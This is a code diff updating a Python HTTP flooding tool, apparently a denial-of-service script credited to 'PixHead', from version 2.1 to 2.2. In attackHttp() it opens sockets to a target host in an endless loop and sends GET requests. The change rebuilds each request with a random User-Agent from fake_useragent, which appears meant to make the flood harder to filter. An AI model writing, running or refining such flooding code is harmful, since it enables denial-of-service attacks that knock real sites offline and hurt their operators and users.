@@ -1,16 +1,17 @@
 # -*- coding: utf-8 -*-
 
-from datetime import datetime
-from scapy.all import *
-import socket
-import random
 import sys
 import time
+import socket
+import random
+from scapy.all import *
+from datetime import datetime
 from threading import Thread
 from termcolor import colored
+from fake_useragent import UserAgent
 
 
-version = "2.1"
+version = "2.2"
 
 def showBanner():
 	with open("lib/banner.txt") as f:
@@ -106,14 +107,6 @@ url = url.replace("//", "/")
 for i in range(len(list(host))):
 	d += "-"
 
-request  = "GET /" + url + " HTTP/1.1\n"\
-		"Host: " + host +"\n"\
-                "Connection: close\n"\
-                "User-agent: Mozila/5.0 (Windows: U; Windows NT 5.1; fr; rv:1.8.1.3) "\
-                        "Gecko/20070309 firefox/2.0.0.3\n"\
-                "Referer: http://google.com/\n"\
-		"\n"
-
 print("[*]Author: PixHead")
 print(d)
 print("[+]TARGET: " + host + " ¦")
@@ -137,6 +130,14 @@ def attackHttp():
 	while True:
 		req += 1
 		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		ua = UserAgent()
+
+		request  = "GET /" + url + " HTTP/1.1\n"\
+				"Host: " + host +"\n"\
+                "Connection: close\n"\
+                "User-agent: " + ua.random +  "\n"\
+                "Referer: http://google.com/\n"\
+		"\n"
 
 		try:
 			sock.connect((host, port))
